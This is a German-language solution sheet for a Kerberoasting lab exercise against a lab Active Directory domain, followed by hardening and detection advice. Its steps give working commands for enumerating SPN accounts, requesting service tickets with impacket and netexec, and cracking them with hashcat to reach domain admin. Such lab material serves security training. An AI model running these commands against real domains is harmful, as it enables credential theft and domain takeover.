# Lösung – Übung 06: Kerberoasting

`<DC>` = DC-IP, Low-Priv `lab.local\mmuster:Passwort`.

## 1. SPN-Accounts auflisten

```bash
GetUserSPNs.py lab.local/mmuster:'Passwort' -dc-ip <DC>
```
```
ServicePrincipalName   Name     MemberOf
MSSQLSvc/dc.lab.local:1433  svc_sql  CN=Domain Admins,...   <- privilegiert!
```

## 2. TGS anfordern

```bash
GetUserSPNs.py lab.local/mmuster:'Passwort' -dc-ip <DC> -request -outputfile kerb.hash
# netexec-Variante:
netexec ldap <DC> -u mmuster -p 'Passwort' --kerberoasting kerb.hash
```
`kerb.hash` enthält `$krb5tgs$23$*svc_sql*...`.

## 3. Cracken

```bash
hashcat -m 13100 -a 0 kerb.hash /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.hash --show
```

## 4. Rechte prüfen

```bash
netexec smb <DC> -u svc_sql -p '<gecracktes_pw>'
# in BloodHound/ldapdomaindump: Gruppenmitgliedschaft von svc_sql
```
Ist `svc_sql` z. B. in **Domain Admins** → direkter Weg zur Domänenübernahme.

## 5. Warum lohnend / Schutz

Service-Accounts haben oft **schwache, jahrelang unveränderte** Passwörter **und** hohe Rechte (bequeme Konfiguration). Ein gecrackter privilegierter Service-Account = Eskalation.
**Schutz:**
- **gMSA** (Group Managed Service Accounts) – lange, automatisch rotierte Passwörter → praktisch nicht crackbar.
- sonst: **25+ Zeichen** zufällig, regelmäßige Rotation, **AES** statt RC4 (RC4-TGS sind leichter), least privilege (Service-Accounts nicht in DA).
- **Detection:** Event **4769** (TGS-Request), gehäuft/RC4 = verdächtig.

## Härtung

gMSA/MSA, starke SPN-Account-Passwörter, Service-Accounts aus privilegierten Gruppen entfernen, AES erzwingen, Monitoring.

## Häufige Fehler / Troubleshooting

- **Clock-Skew:** Zeit sync.
- **Kein SPN gefunden:** Service-Account mit SPN anlegen (Übung 01).
- **RC4 vs AES:** RC4-TGS (`$23$`) crackt schneller; AES (`$17/18$`) braucht Mode 19600/19700.
- **Nicht crackbar:** gMSA/starkes PW → als „nicht crackbar" vermerken (gut).
